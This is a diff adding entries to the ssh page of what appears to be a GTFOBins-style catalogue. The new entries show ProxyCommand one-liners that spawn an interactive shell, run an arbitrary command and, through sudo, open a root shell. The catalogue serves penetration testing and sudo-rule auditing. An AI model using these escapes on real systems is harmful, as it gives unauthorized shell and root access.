@@ -3,6 +3,20 @@ functions:
   execute-interactive:
     - description: Reconnecting may help bypassing restricted shells.
       code: ssh localhost $SHELL --noprofile --norc
+    - description: Spawn interactive shell through ProxyCommand option.
+      code: ssh -o ProxyCommand="/bin/bash -c 'exec 10<&0 11>&1 0<&2 1>&2; /bin/bash -i'" whatever.invalid
+  execute-non-interactive:
+    - description: The executed command output is not shown and can be redirected to a file.
+      code: |
+        CMD=/usr/bin/id
+        ssh -o ProxyCommand="${CMD}" whatever.invalid
+  sudo-enabled:
+    - description: Spawn interactive root shell through ProxyCommand option.
+      code: sudo ssh -o ProxyCommand="/bin/bash -c 'exec 10<&0 11>&1 0<&2 1>&2; /bin/bash -i'" whatever.invalid
+    - description: The executed command output is not shown and can be redirected to a file.
+      code: |
+        CMD=/usr/bin/id
+        sudo ssh -o ProxyCommand="${CMD}" whatever.invalid
   download:
     - description: Fetch a remote file from a SSH server.
       code: |
